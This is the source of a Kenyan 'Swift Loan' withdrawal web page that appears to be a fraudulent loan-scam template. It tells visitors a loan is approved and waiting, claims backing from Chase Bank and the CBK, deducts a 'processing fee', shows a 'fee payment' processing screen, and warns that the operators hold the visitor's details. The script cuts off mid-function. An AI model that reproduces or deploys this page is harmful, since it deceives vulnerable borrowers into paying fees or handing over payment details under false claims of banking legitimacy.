<!DOCTYPE html>
<html lang="en-KE">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Loan Withdrawal | Swift Loan - Withdraw your approved loan</title>
    <meta name="description" content="Withdraw your approved Swift Loan instantly. Secure loan disbursement process in Kenya.">
    <!-- Standard favicon -->
<link rel="icon" type="image/png" href="loan-logo.png">

<!-- High-resolution icons for Chrome & Android -->
<link rel="icon" sizes="192x192" href="loan-logo.png">
<link rel="icon" sizes="256x256" href="loan-logo.png">
<link rel="icon" sizes="512x512" href="loan-logo.png">

<!-- Shortcut icon (for older browsers) -->
<link rel="shortcut icon" href="loan-logo.png">

<!-- Apple devices (iPhone/iPad) -->
<link rel="apple-touch-icon" href="swiftloan-logo.png">
    <!-- Open Graph Tags -->
    <meta property="og:title" content="Loan Withdrawal - Swift Loan Kenya">
    <meta property="og:description" content="Withdraw your approved loan instantly with Swift Loan Kenya.">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://swiftloan.ke/loan-withdrawal.html">
    
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#FF6B00',
                        'primary-dark': '#cc5600',
                        'primary-light': '#fff3eb',
                        'dark-blue': '#001F5C'
                    }
                }
            }
        }
    </script>
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        html {
            scroll-behavior: smooth;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #fff3eb 0%, #ffffff 50%, #f5f5f5 100%);
            min-height: 100vh;
        }
        
        .swift-primary { color: #FF6B00; }
        .swift-primary-bg { background-color: #FF6B00; }
        .swift-primary-hover:hover { background-color: #cc5600; }
        .swift-primary-light { background-color: #fff3eb; }
        .swift-dark-blue { color: #001F5C; }
        .swift-dark-blue-bg { background-color: #001F5C; }
        
        .gradient-card {
            background: linear-gradient(135deg, #ffffff 0%, #fff8f3 100%);
            backdrop-filter: blur(10px);
        }
        
        .shadow-swift {
            box-shadow: 0 20px 40px -5px rgba(255, 107, 0, 0.15), 0 10px 20px -5px rgba(255, 107, 0, 0.1);
        }
        
        .transition-swift {
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .pulse-ring {
            animation: pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
        }

        @keyframes pulse-ring {
            0% {
                transform: scale(0.33);
            }
            40%, 50% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                transform: scale(1.33);
            }
        }

        .bouncing-icon {
            animation: bounce-gentle 2s ease-in-out infinite;
        }

        @keyframes bounce-gentle {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        .slide-in {
            animation: slideIn 0.8s cubic-bezier(0.23, 1, 0.320, 1) forwards;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .processing-animation {
            animation: processing 2s linear infinite;
        }

        @keyframes processing {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .shake {
            animation: shake 0.5s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* Flowing arrow animation */
        .flowing-arrows {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .arrow-flow {
            animation: arrow-flow 2s ease-in-out infinite;
        }

        .arrow-flow:nth-child(2) {
            animation-delay: 0.3s;
        }

        .arrow-flow:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes arrow-flow {
            0%, 100% {
                opacity: 0.3;
                transform: translateX(-5px) scale(0.8);
            }
            50% {
                opacity: 1;
                transform: translateX(5px) scale(1.1);
            }
        }

        /* Modal styles */
        .modal-overlay {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
        }

        .modal-content {
            animation: modalSlideIn 0.4s cubic-bezier(0.23, 1, 0.320, 1) forwards;
        }

        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(50px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        /* Form validation styles */
        .form-field {
            transition: all 0.3s ease;
        }

        .form-field:focus {
            border-color: #FF6B00;
            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
        }

        .form-field.error {
            border-color: #ef4444;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
        }

        .form-field.success {
            border-color: #10b981;
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
        }

        .error-message {
            color: #ef4444;
            font-size: 0.875rem;
            margin-top: 0.25rem;
        }

        /* Enhanced processing overlay */
        .processing-overlay-enhanced {
            background: linear-gradient(135deg, #FF6B00 0%, #cc5600 100%);
            position: relative;
            overflow: hidden;
        }

        .processing-overlay-enhanced::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            animation: shimmer 3s ease-in-out infinite;
        }

        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .legitimacy-indicator {
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        /* Mobile responsiveness */
        @media (max-width: 768px) {
            .hero-title {
                font-size: 2rem;
                line-height: 1.2;
            }
            
            .modal-content {
                margin: 1rem;
                width: calc(100% - 2rem);
            }
        }

        .error-state {
            background: linear-gradient(135deg, #fee2e2 0%, #fef2f2 100%);
            border: 1px solid #fecaca;
        }

        .success-state {
            background: linear-gradient(135deg, #dcfce7 0%, #f0fdf4 100%);
            border: 1px solid #bbf7d0;
        }

        #successAlert,
        #errorAlert {
            scroll-margin-top: 90px;
        }

        /* Method selection cards */
        .method-card {
            transition: all 0.3s ease;
            cursor: pointer;
            border: 2px solid transparent;
        }

        .method-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        .method-card.selected {
            border-color: #FF6B00;
            background: linear-gradient(135deg, #fff3eb 0%, #ffe8d6 100%);
        }

        /* Progress bar animation */
        .progress-bar-animated {
            background: linear-gradient(45deg, #10b981, #34d399);
            animation: progressFill 3s ease-in-out forwards;
        }

        @keyframes progressFill {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
@media print {
  /* Hide everything by default */
  body * {
    visibility: hidden !important;
  }

  /* Show only the receipt container and its contents */
  #receiptCardContainer, 
  #receiptCardContainer * {
    visibility: visible !important;
  }

  /* Position receipt nicely on page */
  #receiptCardContainer {
    margin: 0 auto;
    padding: 20px !important;
    width: 100% !important;
    max-width: 800px;
    border: 1px solid #000;
    box-shadow: none !important;
  }

  /* Force print header (logo + name) to show */
  #receiptCardContainer .print\:flex {
    display: flex !important;
  }

  /* Typography for print */
  #receiptCardContainer h2, 
  #receiptCardContainer h1 {
    font-size: 18pt !important;
    color: #000 !important;
  }
  #receiptCardContainer p, 
  #receiptCardContainer span {
    font-size: 11pt !important;
    color: #000 !important;
  }

  /* Hide buttons on print */
  #receiptCardContainer a,
  #receiptCardContainer button {
    display: none !important;
  }
}
</style>
 <!-- Brevo Conversations {literal} -->
<script>
    (function(d, w, c) {
        w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
        w[c] = w[c] || function() {
            (w[c].q = w[c].q || []).push(arguments);
        };
        var s = d.createElement('script');
        s.async = true;
        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
        if (d.head) d.head.appendChild(s);
    })(document, window, 'BrevoConversations');
</script>
<!-- /Brevo Conversations {/literal} -->
   </head>
<body class="bg-gradient-to-br from-orange-50 via-white to-gray-100">
    <!-- Header -->
    <header class="bg-white/80 backdrop-blur-md shadow-sm border-b border-gray-100 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-16">
                <!-- Logo -->
<div class="flex-shrink-0">
  <div class="flex items-center">
    <div class="w-10 h-10 swift-primary-bg rounded-lg flex items-center justify-center">
      <!-- Loan Withdrawal Wallet SVG icon -->
      <svg class="text-white" fill="currentColor" height="20" width="20" viewBox="0 0 24 24">
        <!-- Wallet outline -->
        <path d="M21 7H5c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 
                 2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm0 
                 10H5V9h16v8z"/>
        <!-- Downward arrow (withdrawal) -->
        <path d="M12 3v6l-2-2-1.41 1.41L12 12l3.41-3.59L14 
                 7l-2 2V3h-2z"/>
        <!-- Small circle as wallet button -->
        <circle cx="17" cy="13" r="1"/>
      </svg>
    </div>
    <span class="ml-3 text-xl font-bold swift-dark-blue">Swift Loan Wallet</span>
  </div>
</div>

                <!-- Action Buttons -->
                <div class="flex items-center space-x-3">
                    <button onclick="goBack()" class="border border-primary text-primary hover:bg-primary hover:bg-opacity-10 px-4 py-2 text-sm font-medium rounded-md transition-swift">
                        <i class="fas fa-arrow-left mr-1"></i> 
                    </button>
                </div>
            </div>
        </div>
    </header>
    <!-- Main Content -->
    <main class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <!-- Page Header -->
        <div class="text-center mb-8 slide-in">
            <div class="inline-flex items-center px-4 py-2 bg-green-100 text-green-800 rounded-full text-sm font-medium mb-6">
                <i class="fas fa-check-circle mr-2"></i>
                Loan Transfer to wallet  was Successfull & Ready for Withdrawal.

                powered by CHASEBANK and regulated by CBK .Acount number: [DDQTSU]
            </div>

            <h1 class="hero-title text-3xl lg:text-4xl font-bold swift-dark-blue leading-tight mb-4">
                Withdraw Your 
                <span class="swift-primary">Loan Funds Instantly</span>
            </h1>
            <p class="text-lg text-gray-600 max-w-2xl mx-auto">
                Your loan has been approved and is ready for instant withdrawal to your preferred account.Contact our support team through the blue chat message button at the bottom right.,we are always online 24/7.note that for repayment  will be done at the repayment period,we have your details for follow up.
            </p>
        </div>

        <!-- Error Alert (Hidden by default) -->
        <div id="errorAlert" class="hidden mb-8 error-state rounded-2xl p-6 slide-in">
            <div class="flex items-start space-x-3">
                <i class="fas fa-exclamation-triangle text-red-600 text-xl mt-0.5 flex-shrink-0"></i>
                <div>
                    <h3 class="text-lg font-semibold text-red-800 mb-2">Transaction Failed</h3>
                    <p id="errorMessage" class="text-red-700 text-sm"></p>
                    <button onclick="hideError()" class="mt-3 text-red-600 hover:text-red-800 text-sm font-medium underline">
                        Dismiss
                    </button>
                </div>
            </div>
        </div>

        <!-- Success Alert (Hidden by default) -->
        <div id="successAlert" class="hidden mb-8 success-state rounded-2xl p-6 slide-in bg-green-100 border border-green-300">
            <div class="flex items-start space-x-3">
                <i class="fas fa-check-circle text-green-600 text-xl mt-0.5 flex-shrink-0"></i>
                <div class="w-full">
                    <h3 id="successHeading" class="text-lg font-semibold text-green-800 mb-2">Withdrawal Successfully Initiated!</h3>
                    <p id="successMessage" class="text-green-700 text-sm mb-3"></p>

                    <!-- Progress Bar -->
                    <div class="w-full bg-gray-200 rounded-full h-5 overflow-hidden relative mb-4">
                        <div id="progressBar" class="bg-green-600 h-5 w-0 transition-all duration-200"></div>
                        <span id="progressText" 
                              class="absolute inset-0 flex items-center justify-center text-xs font-medium text-white">
                              Processing previous withdrawal...
                        </span>
                    </div>
            <!-- Receipt Card (appears after withdrawal initiated) -->
<div id="receiptCardContainer" class="mt-6"></div>
              <!-- Need Help Link -->
<div class="text-center mt-4">
  <button 
    onclick="openHelpModal()" 
    class="text-sm font-medium swift-dark-blue hover:text-primary underline">
    Need help? Verify Transaction 
  </button>
</div>
                    <!-- Logos Row with Arrow Transfer Animation -->
                    <div class="flex justify-center items-center space-x-8 mt-4">
                        <!-- Swift Wallet Logo -->
                        <div class="flex flex-col items-center">
                            <div class="w-12 h-12 bg-primary rounded-lg flex items-center justify-center">
                                <i class="fas fa-wallet text-white text-xl"></i>
                            </div>
                            <span class="text-xs text-gray-700 mt-1 font-medium">Swift Wallet</span>
                        </div>

                        <!-- Transfer Animation (Flowing Arrows) -->
                        <div class="flowing-arrows">
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                        </div>

                        <!-- Selected Method Logo -->
                        <div class="flex flex-col items-center">
                            <div id="selectedMethodLogo" class="w-12 h-12 bg-green-600 rounded-lg flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-white text-xl"></i>
                            </div>
                            <span id="selectedMethodName" class="text-xs text-gray-700 mt-1 font-medium">M-Pesa</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Loan Summary Card -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
            <div class="flex items-center justify-between mb-6">
                <h2 class="text-2xl font-bold swift-dark-blue">Loan Summary</h2>
                <div class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">
                    <i class="fas fa-check mr-1"></i> APPROVED
                </div>
            </div>

            <div class="grid md:grid-cols-2 gap-8">
                <!-- Customer Details -->
                <div class="space-y-4">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Customer Details</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Full Name:</span>
                            <span id="customerName" class="font-semibold swift-dark-blue">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Phone Number:</span>
                            <span id="customerPhone" class="font-semibold swift-dark-blue">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Loan ID:</span>
                            <span id="loanId" class="font-semibold text-primary">Loading...</span>
                        </div>
                    </div>
                </div>

                <!-- Loan Details -->
                <div class="space-y-4">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Loan Details</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Loan Amount:</span>
                            <span id="loanAmount" class="font-bold text-green-600">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Processing Fee:</span>
                            <span id="processingFee" class="font-semibold text-primary">Loading...</span>
                        </div>
                        <div class="flex justify-between pt-3 border-t border-gray-200">
                            <span class="text-lg font-bold swift-dark-blue">Available Balance:</span>
                            <span id="availableBalance" class="text-2xl font-bold text-primary">Loading...</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Withdrawal Section -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
            <div class="text-center mb-8">
                <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4 bouncing-icon">
                    <i class="fas fa-money-bill-transfer text-primary text-2xl"></i>
                </div>
                <h2 class="text-2xl font-bold swift-dark-blue mb-2">Withdraw My Loan</h2>
                <p class="text-gray-600">Choose your preferred withdrawal method and complete the process</p>
            </div>

            <!-- Withdrawal Amount Display -->
            <div class="bg-gradient-to-r from-orange-50 to-orange-100 rounded-xl p-6 mb-8 text-center border-2 border-orange-200 shadow-sm">
                <div class="flex items-center justify-center mb-3">
                    <i class="fas fa-coins text-primary text-lg mr-2"></i>
                    <div class="text-sm font-medium swift-dark-blue">Verified Withdrawal Amount</div>
                </div>
                <div id="withdrawalAmount" class="text-4xl font-bold text-primary mb-2">Loading...</div>
                <div class="text-sm text-gray-600 mb-2">
                    <i class="fas fa-info-circle mr-1"></i>
                    <span id="feeNotice">Actual amount approved; withdrawable from account: [DDQTSU]</span>
                </div>
                <div class="flex justify-center items-center space-x-4 text-xs text-gray-500">
                    <span>
                        <i class="fas fa-university mr-1"></i>
                        Chase Bank LMTD
                    </span>
                    <span>•</span>
                    <span>
                        <i class="fas fa-shield-alt mr-1"></i>
                        Approved amount
                    </span>
                </div>
            </div>

            <!-- Action Buttons -->
            <div class="flex flex-col sm:flex-row gap-4">
                <button 
                    onclick="goBack()"
                    class="flex-1 px-8 py-4 border-2 border-gray-300 text-gray-700 font-semibold rounded-xl hover:bg-gray-50 transition-swift flex items-center justify-center"
                >
                    <i class="fas fa-arrow-left mr-2"></i>
                    Cancel
                </button>
                <button 
                    onclick="showWithdrawalMethods()"
                    id="withdrawBtn"
                    class="flex-1 px-8 py-4 bg-gradient-to-r from-primary to-orange-600 text-white font-bold rounded-xl hover:from-primary-dark hover:to-orange-700 transition-swift flex items-center justify-center shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
                >
                    <i class="fas fa-wallet mr-2"></i>
                    <span id="withdrawText">Choose Withdrawal Method</span>
                </button>
            </div>

            <!-- Important Notice -->
            <div class="mt-8 bg-orange-50 border border-orange-200 rounded-xl p-4">
                <div class="flex items-start space-x-3">
                    <i class="fas fa-info-circle text-primary mt-0.5 flex-shrink-0"></i>
                    <div class="text-sm text-gray-700">
                        <p class="font-semibold mb-2 swift-dark-blue">Important Information:</p>
                        <ul class="space-y-1">
                            <li>• Withdrawal is instant and secure</li>
                            <li>• Ensure your account details are correct</li>
                            <li>• Keep your transaction reference for records</li>
                            <li>• Contact support if you face any issues</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- Security & Trust Indicators -->
        <div class="grid md:grid-cols-3 gap-6 mb-8">
            <div class="text-center p-6 bg-white rounded-xl shadow-sm">
                <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
                    <i class="fas fa-shield-alt text-green-600 text-xl"></i>
                </div>
                <h3 class="font-semibold swift-dark-blue mb-1">100% Secure</h3>
                <p class="text-sm text-gray-600">Bank-level encryption</p>
            </div>
            
            <div class="text-center p-6 bg-white rounded-xl shadow-sm">
                <div class="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-3">
                    <i class="fas fa-bolt text-primary text-xl"></i>
                </div>
                <h3 class="font-semibold swift-dark-blue mb-1">Instant Transfer</h3>
                <p class="text-sm text-gray-600">Real-time processing</p>
            </div>
            
            <div class="text-center p-6 bg-white rounded-xl shadow-sm">
                <div class="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
                    <i class="fas fa-headset text-blue-600 text-xl"></i>
                </div>
                <h3 class="font-semibold swift-dark-blue mb-1">24/7 Support</h3>
                <p class="text-sm text-gray-600">Always here to help</p>
            </div>
        </div>
    </main>

    <!-- Withdrawal Method Selection Modal -->
    <div id="withdrawalMethodModal" class="hidden fixed inset-0 z-50 items-center justify-center modal-overlay">
        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-2xl w-full mx-4 max-h-[90vh] overflow-y-auto">
            <div class="sticky top-0 bg-gradient-to-r from-primary to-orange-600 text-white p-6 rounded-t-2xl z-10">
                <div class="flex items-center justify-between">
                    <div>
                        <h2 class="text-2xl font-bold">Select Withdrawal Method</h2>
                        <p class="text-sm opacity-90 mt-1">Choose how you'd like to receive your funds</p>
                    </div>
                    <button onclick="closeWithdrawalModal()" class="text-white hover:bg-white/20 rounded-full p-2 transition">
                        <i class="fas fa-times text-2xl"></i>
                    </button>
                </div>
            </div>

            <div class="p-6 space-y-4">
                <!-- M-Pesa Method -->
                <div class="method-card border-2 rounded-xl p-6 hover:shadow-lg transition" onclick="selectMethod('mpesa')">
                    <div class="flex items-center space-x-4">
                        <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                            <i class="fas fa-mobile-alt text-green-600 text-2xl"></i>
                        </div>
                        <div class="flex-1">
                            <h3 class="font-bold text-lg swift-dark-blue mb-1">M-Pesa</h3>
                            <p class="text-sm text-gray-600 mb-2">Direct transfer to your M-Pesa account</p>
                            <div class="flex items-center space-x-4 text-xs text-gray-500">
                                <span><i class="fas fa-bolt mr-1"></i>Instant</span>
                                <span><i class="fas fa-shield-alt mr-1"></i>Secure</span>
                                <span><i class="fas fa-check mr-1"></i>Most Popular</span>
                            </div>
                        </div>
                        <i class="fas fa-chevron-right text-gray-400"></i>
                    </div>
                </div>

                <!-- Airtel Money Method -->
                <div class="method-card border-2 rounded-xl p-6 hover:shadow-lg transition" onclick="selectMethod('airtel')">
                    <div class="flex items-center space-x-4">
                        <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center flex-shrink-0">
                            <i class="fas fa-mobile-alt text-red-600 text-2xl"></i>
                        </div>
                        <div class="flex-1">
                            <h3 class="font-bold text-lg swift-dark-blue mb-1">Airtel Money</h3>
                            <p class="text-sm text-gray-600 mb-2">Transfer to your Airtel Money wallet</p>
                            <div class="flex items-center space-x-4 text-xs text-gray-500">
                                <span><i class="fas fa-clock mr-1"></i>2-3 minutes</span>
                                <span><i class="fas fa-shield-alt mr-1"></i>Secure</span>
                            </div>
                        </div>
                        <i class="fas fa-chevron-right text-gray-400"></i>
                    </div>
                </div>

                <!-- Bank Transfer Method -->
                <div class="method-card border-2 rounded-xl p-6 hover:shadow-lg transition" onclick="selectMethod('bank')">
                    <div class="flex items-center space-x-4">
                        <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                            <i class="fas fa-university text-blue-600 text-2xl"></i>
                        </div>
                        <div class="flex-1">
                            <h3 class="font-bold text-lg swift-dark-blue mb-1">Bank Transfer</h3>
                            <p class="text-sm text-gray-600 mb-2">Direct transfer to your bank account</p>
                            <div class="flex items-center space-x-4 text-xs text-gray-500">
                                <span><i class="fas fa-clock mr-1"></i>3-5 minutes</span>
                                <span><i class="fas fa-money-bill mr-1"></i>Higher limits</span>
                            </div>
                        </div>
                        <i class="fas fa-chevron-right text-gray-400"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Withdrawal Details Modal (Method-specific form) -->
    <div id="withdrawalDetailsModal" class="hidden fixed inset-0 z-50 items-center justify-center modal-overlay">
        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-lg w-full mx-4 max-h-[90vh] overflow-y-auto">
            <div class="sticky top-0 bg-gradient-to-r from-primary to-orange-600 text-white p-6 rounded-t-2xl z-10">
                <div class="flex items-center justify-between">
                    <h2 id="detailsModalTitle" class="text-xl font-bold">Withdrawal Details</h2>
                    <button onclick="closeDetailsModal()" class="text-white hover:bg-white/20 rounded-full p-2 transition">
                        <i class="fas fa-times text-xl"></i>
                    </button>
                </div>
            </div>

            <div class="p-6">
                <div id="withdrawalForm"></div>
                
                <div class="flex gap-3 mt-6">
                    <button 
                        onclick="closeDetailsModal()"
                        class="flex-1 px-6 py-3 border-2 border-gray-300 text-gray-700 font-semibold rounded-lg hover:bg-gray-50 transition"
                    >
                        Back
                    </button>
                    <button 
                        onclick="processWithdrawal()"
                        class="flex-1 px-6 py-3 bg-gradient-to-r from-primary to-orange-600 text-white font-bold rounded-lg hover:from-primary-dark hover:to-orange-700 transition shadow-lg"
                    >
                        Confirm Withdrawal
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Enhanced Processing Overlay -->
    <div id="processingOverlay" class="hidden fixed inset-0 z-[100] flex items-center justify-center processing-overlay-enhanced">
        <div class="text-center text-white px-6">
            <div class="w-24 h-24 border-4 border-white border-t-transparent rounded-full mx-auto mb-6 processing-animation"></div>
            <h3 class="text-2xl font-bold mb-2">Processing Your fee Payment Request...</h3>
            <p id="processingMessage" class="text-sm opacity-90 mb-4">Please wait while we securely process your transaction</p>
            <div class="flex justify-center items-center space-x-2 legitimacy-indicator">
                <i class="fas fa-shield-alt"></i>
                <span class="text-xs">Secured by 256-bit encryption</span>
            </div>
        </div>
    </div>

    <!-- Help/Contact Modal -->
    <div id="helpModal" class="hidden fixed inset-0 z-50 items-center justify-center modal-overlay">
        <div class="modal-content bg-white rounded-2xl shadow-2xl max-w-md w-full mx-4">
            <div class="bg-gradient-to-r from-primary to-orange-600 text-white p-6 rounded-t-2xl">
                <div class="flex items-center justify-between">
                    <h2 class="text-xl font-bold">Need Help?</h2>
                    <button onclick="closeHelpModal()" class="text-white hover:bg-white/20 rounded-full p-2 transition">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
            
            <div class="p-6 space-y-4">
                <p class="text-gray-700">Contact our support team for assistance:</p>
                
                <div class="space-y-3">
                    <a href="tel:+254700000000" class="flex items-center space-x-3 p-4 bg-gray-50 rounded-lg hover:bg-gray-100 transition">
                        <i class="fas fa-phone text-primary text-xl"></i>
                        <div>
                            <div class="font-semibold swift-dark-blue">Call Us</div>
                            <div class="text-sm text-gray-600">+254 700 000 000</div>
                        </div>
                    </a>
                    
                    <a href="mailto:support@swiftloan.ke" class="flex items-center space-x-3 p-4 bg-gray-50 rounded-lg hover:bg-gray-100 transition">
                        <i class="fas fa-envelope text-primary text-xl"></i>
                        <div>
                            <div class="font-semibold swift-dark-blue">Email Us</div>
                            <div class="text-sm text-gray-600">support@swiftloan.ke</div>
                        </div>
                    </a>
                    
                    <button class="w-full flex items-center justify-center space-x-3 p-4 bg-gradient-to-r from-primary to-orange-600 text-white rounded-lg hover:from-primary-dark hover:to-orange-700 transition">
                        <i class="fas fa-comment text-xl"></i>
                        <span class="font-semibold">Live Chat Support</span>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-gray-50 border-t border-gray-200 py-8 mt-12">
        <div class="max-w-4xl mx-auto px-4 text-center text-gray-600">
            <div class="flex items-center justify-center space-x-4 mb-4">
                <span class="text-sm">Powered by</span>
                <!-- CHASEBANK SVG Logo -->
                <div class="flex items-center space-x-1">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M3 6h18M3 12h18M3 18h18" stroke="#001F5C" stroke-width="2" stroke-linecap="round"/>
                        <circle cx="12" cy="12" r="9" stroke="#FF6B00" stroke-width="1.5" fill="none"/>
                    </svg>
                    <span class="font-bold swift-dark-blue">CHASE BANK</span>
                </div>
                <span class="text-sm">Regulated by CBK</span>
            </div>
            <p class="text-xs text-gray-500">
                © 2024 Swift Loan. All rights reserved. | Licensed microfinance institution
            </p>
        </div>
    </footer>

    <script>
        // Global variables
        let loanData = {};
        let selectedWithdrawalMethod = '';
        let isProcessing = false;

        // Kenyan Banks List
        const kenyanBanks = [
            "Kenya Commercial Bank (KCB)",
            "Equity Bank",
            "Co-operative Bank of Kenya",
            "Absa Bank Kenya",
            "Standard Chartered Kenya",
            "NCBA Bank",
            "Stanbic Bank",
            "Diamond Trust Bank (DTB)",
            "I&M Bank",
            "Sidian Bank",
            "Prime Bank",
            "Guardian Bank",
            "National Bank of Kenya",
            "Family Bank",
            "Bank of Africa Kenya",
            "Credit Bank",
            "Housing Finance Company of Kenya (HF Group)",
            "Paramount Bank",
            "Consolidated Bank of Kenya",
            "SBM Bank Kenya",
            "Kingdom Bank",
            "Bank of Baroda Kenya",
            "Bank of India Kenya",
            "Citibank Kenya",
            "Habib Bank AG Zurich",
            "Gulf African Bank",
            "First Community Bank",
            "Mayfair Bank",
            "Middle East Bank Kenya",
            "Eco Bank Kenya",
            "UBA Kenya",
            "ABC Bank",
            "Guaranty Trust Bank Kenya",
            "Victoria Commercial Bank Limited"
        ];

        // Load loan data from localStorage
        function loadLoanData() {
            try {
                const selectedOffer = localStorage.getItem('swift_selected_offer');
                const customerName = localStorage.getItem('swift_customer_name') || 'Applicant';
                
                if (!selectedOffer) {
                    showError('No loan offer selected. Please go back and select a loan offer first.');
                    document.getElementById('withdrawBtn').disabled = true;
                    return;
                }

                loanData = JSON.parse(selectedOffer);
                console.log('Loaded loan data:', loanData);

                if (!loanData.amount || !loanData.fee || !loanData.phone || !loanData.tracking) {
                    showError('Invalid loan data. Please go back and select a loan offer again.');
                    document.getElementById('withdrawBtn').disabled = true;
                    return;
                }

                const loanAmount = parseFloat(loanData.amount);
                const feeAmount = parseFloat(loanData.fee);
                const availableBalance = loanAmount - feeAmount;

                // Update customer details
                document.getElementById('customerName').textContent = customerName;
                document.getElementById('customerPhone').textContent = loanData.phone;
                document.getElementById('loanId').textContent = loanData.tracking;

                // Update loan details
                document.getElementById('loanAmount').textContent = `KES ${loanAmount.toLocaleString()}`;
                document.getElementById('processingFee').textContent = `KES ${feeAmount.toLocaleString()}`;
                document.getElementById('availableBalance').textContent = `KES ${availableBalance.toLocaleString()}`;
                document.getElementById('withdrawalAmount').textContent = `KES ${availableBalance.toLocaleString()}`;

                console.log('Loan data loaded successfully');
            } catch (error) {
                console.error('Error loading loan data:', error);
                showError('Failed to load loan information. Please try again.');
                document.getElementById('withdrawBtn').disabled = true;
            }
        }

        // Show withdrawal methods modal
        function showWithdrawalMethods() {
            document.getElementById('withdrawalMethodModal').classList.remove('hidden');
            document.getElementById('withdrawalMethodModal').classList.add('flex');
        }

        // Close withdrawal method modal
        function closeWithdrawalModal() {
            document.getElementById('withdrawalMethodModal').classList.add('hidden');
            document.getElementById('withdrawalMethodModal').classList.remove('flex');
        }

        // Select withdrawal method
        function selectMethod(method) {
            selectedWithdrawalMethod = method;
            
            // Update UI to show selection
            document.querySelectorAll('.method-card').forEach(card => {
                card.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
            
            // Show method-specific form after a short delay
            setTimeout(() => {
                closeWithdrawalModal();
                showWithdrawalDetails(method);
            }, 300);
        }

        // Show withdrawal details modal with method-specific form
        function showWithdrawalDetails(method) {
            const modal = document.getElementById('withdrawalDetailsModal');
